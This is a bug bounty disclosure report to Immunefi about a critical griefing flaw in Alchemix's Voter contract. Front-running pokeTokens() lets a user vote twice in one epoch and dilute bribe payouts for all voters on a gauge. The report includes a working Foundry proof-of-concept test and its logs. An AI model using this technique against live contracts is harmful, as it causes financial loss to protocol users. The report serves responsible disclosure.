# 30919 - \[SC - Critical] Front running of pokeTokens could lead to loss ...

Submitted on May 8th 2024 at 04:39:00 UTC by @jecikpo for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30919

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The `Voter.pokeTokens()` allows an admin to vote on behalf of any veALCX token owner for a given set of gauges. It is assumed that the purpose of the function is to provide automated regular voting services by the Alchemix system. The `pokeTokens()` does not check if the user already voted in the current Epoch. If the user did vote already, the next vote on the same epoch will affect the bribe accounting and diminish the bribes for all voters of the given gauge(s).

## Vulnerability Details

The `Voter.pokeToken()` calls `poke()` for each tokenId specificed. `poke()` calls `_vote()` which issues the vote to the given gauges. For each gauge specified `Bribe.deposit()` is called. `deposit()` increases (among other things): `totalSupply` and `totalVoting`. Those variables are then checkpointed and used when earned bribes are beeing calculated at `earned()`.

A malicious user can orchestrate a griefing attack, by front-running the `pokeTokens()` call. This will inflate the `totalVoting` which will diminish the amounts received by all users entitled to bribe claiming.

## Impact Details

The bribes of all users on a given gauge will be diminished by proportional amount of the malicious user extra voting power.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L215>

## Proof of Concept

Copy the following code to the `Voting.t.sol`:

```solidity
function testPokeTokensFrontrunning() public {
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, 156 days, false);
        uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, 156 days, false);
        address bribeAddress = voter.bribes(address(sushiGauge));

        createThirdPartyBribe(bribeAddress, bal, TOKEN_1);
        //voter.distribute();

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        uint[] memory pokeTokens = new uint[](1);
        pokeTokens[0] = tokenId1;

        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        hevm.prank(beef);
        voter.vote(tokenId2, pools, weights, 0);

        //console.log("Bribe lastEarned: ", )
        uint256 adminBribes;
        uint256 beefBribes;

        hevm.warp(block.timestamp + 6 days);

        // epoch 2
        hevm.warp(block.timestamp + nextEpoch);
        createThirdPartyBribe(bribeAddress, bal, TOKEN_1);
        voter.distribute();
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);
        hevm.prank(beef);
        voter.vote(tokenId2, pools, weights, 0);
        adminBribes = IBribe(bribeAddress).earned(bal, tokenId1);
        beefBribes = IBribe(bribeAddress).earned(bal, tokenId2);
        console.log("[admin] earned bribes epoch 2: %d", adminBribes);
        console.log("[beef] earned bribes epoch 2: %d", beefBribes);

        // epoch 3
        hevm.warp(block.timestamp + nextEpoch);
        createThirdPartyBribe(bribeAddress, bal, TOKEN_1);
        voter.distribute();

        // someone front runs the pokeTokens()
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        // admin calls pokeTokens
        hevm.prank(voter.admin());
        voter.pokeTokens(pokeTokens);

        hevm.prank(beef);
        voter.vote(tokenId2, pools, weights, 0);
        adminBribes = IBribe(bribeAddress).earned(bal, tokenId1);
        beefBribes = IBribe(bribeAddress).earned(bal, tokenId2);
        console.log("[admin] earned bribes epoch 3: %d", adminBribes);
        console.log("[beef] earned bribes epoch 3: %d", beefBribes);
        //console.log("voting power: %d", voter.maxVotingPower(tokenId1));

        // epoch 4
        hevm.warp(block.timestamp + nextEpoch);
        createThirdPartyBribe(bribeAddress, bal, TOKEN_1);
        voter.distribute();
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);
        hevm.prank(beef);
        voter.vote(tokenId2, pools, weights, 0);
        adminBribes = IBribe(bribeAddress).earned(bal, tokenId1);
        beefBribes = IBribe(bribeAddress).earned(bal, tokenId2);
        console.log("[admin] earned bribes epoch 4: %d", adminBribes);
        console.log("[beef] earned bribes epoch 4: %d", beefBribes);

       
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);
        hevm.prank(beef);
        voter.claimBribes(bribes, tokens, tokenId2);

        console.log("[admin] total bribes claimed: %d", ERC20(bal).balanceOf(admin));
        console.log("[beef] total bribes claimed: %d", ERC20(bal).balanceOf(beef));
    }
```

First run the code with the following lines commented (i.e. no front-running):

```solidity
// someone front runs the pokeTokens()
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);
```

This will result with normal bribe accumulation by both users `admin` and `beef`:

```
[PASS] testPokeTokensFrontrunning() (gas: 6499697)
Logs:
  [admin] earned bribes epoch 2: 500000000000000000
  [beef] earned bribes epoch 2: 500000000000000000
  [admin] earned bribes epoch 3: 1000000000000000000
  [beef] earned bribes epoch 3: 1000000000000000000
  [admin] earned bribes epoch 4: 1500000000000000000
  [beef] earned bribes epoch 4: 1500000000000000000
  [admin] total bribes claimed: 1500000000000000000
  [beef] total bribes claimed: 1500000000000000000
```

Once the lines above are enabled, the user effectively voted twice during same epoch and the following happens:

```
[PASS] testPokeTokensFrontrunning() (gas: 6640350)
Logs:
  [admin] earned bribes epoch 2: 500000000000000000
  [beef] earned bribes epoch 2: 500000000000000000
  [admin] earned bribes epoch 3: 1000000000000000000
  [beef] earned bribes epoch 3: 1000000000000000000
  [admin] earned bribes epoch 4: 1333333333333333333
  [beef] earned bribes epoch 4: 1333333333333333333
  [admin] total bribes claimed: 1333333333333333333
  [beef] total bribes claimed: 1333333333333333333
```

The amount is reduced, each user gets 33%, instead of 50% of the bribe share.
